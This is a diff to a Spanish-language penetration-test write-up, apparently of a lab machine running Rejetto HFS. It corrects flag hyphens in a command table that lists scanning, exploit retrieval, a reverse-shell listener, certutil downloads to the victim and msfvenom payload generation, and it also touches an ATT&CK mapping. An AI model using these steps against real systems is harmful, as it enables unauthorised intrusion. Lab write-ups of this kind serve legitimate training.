@@ -298,12 +298,12 @@ wmic service get name, displayname, pathname, startmode | findstr /i "auto" | fi
 
 | # | Comando | Descripción |
 |---|---|---|
-| 1 | `nmap *sV *sC *p*` | Escaneo de servicios y puertos. |
-| 2 | `searchsploit *m 39161` | Descarga de exploit de Rejetto. |
-| 3 | `python3 *m http.server 80` | Servidor para transferencia de archivos. |
-| 4 | `nc *lvnp 443` | Listener para recibir la shell reversa. |
-| 5 | `certutil *urlcache *f ...` | Descarga de binarios en la víctima. |
-| 6 | `msfvenom *p ... *f exe` | Generación de payload malicioso. |
+| 1 | `nmap -sV -sC -p-` | Escaneo de servicios y puertos. |
+| 2 | `searchsploit -m 39161` | Descarga de exploit de Rejetto. |
+| 3 | `python3 -m http.server 80` | Servidor para transferencia de archivos. |
+| 4 | `nc -lvnp 443` | Listener para recibir la shell reversa. |
+| 5 | `certutil -urlcache -f ...` | Descarga de binarios en la víctima. |
+| 6 | `msfvenom -p ... -f exe` | Generación de payload malicioso. |
 | 7 | `sc stop/start [Service]` | Manipulación de servicios de Windows. |
 
 ---
@@ -312,7 +312,7 @@ wmic service get name, displayname, pathname, startmode | findstr /i "auto" | fi
 
 | Táctica | Técnica | ID |
 |---|---|---|
-| Initial Access | Exploit Public*Facing Application | T1190 |
+| Initial Access | Exploit Public-Facing Application | T1190 |
 | Execution | Command and Scripting Interpreter | T1059 |
 | Persistence | Create or Modify System Process | T1543.003 |
 | Privilege Escalation | Hijack Execution Flow | T1574.011 |
@@ -329,4 +329,4 @@ wmic service get name, displayname, pathname, startmode | findstr /i "auto" | fi
 ---
 
 ## 9. Deslinde de responsabilidad
-Este reporte se emite con fines exclusivamente educativos. **El autor no se hace responsable del uso indebido de las técnicas aquí descritas.**
+Este reporte se emite con fines exclusivamente educativos. **El autor no se hace responsable del uso indebido de las técnicas aquí descritas.** 
